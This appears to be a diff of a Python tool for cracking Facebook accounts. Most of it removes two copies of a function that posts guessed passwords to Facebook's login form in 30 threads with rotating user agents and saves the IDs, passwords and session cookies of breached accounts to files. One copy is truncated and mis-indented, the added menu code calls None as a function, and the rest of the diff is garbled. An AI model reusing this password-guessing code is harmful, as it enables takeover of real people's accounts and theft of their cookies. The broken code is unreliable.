@@ -62,7 +62,29 @@ def cetak(b):
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
 
+def ud():
+    os.system('clear')
+    jalan(logo)
+    opt = input('\n   CHOOSE OPTION >>>\033[1;37m ')
+    if opt == '1':
+        os.system('xdg-open https://youtube.com/channel/UCqmAeJg_2YaF9q_zFIxwSlQ')
+        FD()
+        return None
+    None('\n\x1b[1;31mEXIT\x1b[0;97m')
 
+
+def FD():
+    os.system('clear')
+    print(logo)
+    print('\x1b[1;33m [1] FOLLOW THIS MY FACEBOOK PAGE')
+    print(' [2] EXIT')
+    opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')
+    if opt == '1':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100075160338795')
+        o()
+        return None
+    None('\n\x1b[1;31mEXIT\x1b[0;97m')
+    
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
@@ -14602,122 +14624,9 @@ def action():
 #					        cps.close()
 #					        cpb.append(c+user+pass2)
 																	
-def rcrack(main, id):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
- if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-
-def rcrack(main, id):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('    \033[1;32m[ⓇDX-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/ⓇDX-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('    \33[1;30m[ⓇDX-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ⓇDX-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(' %s[ⓇDX-] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
-    except:
-        pass
+															
+		except:
+			pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
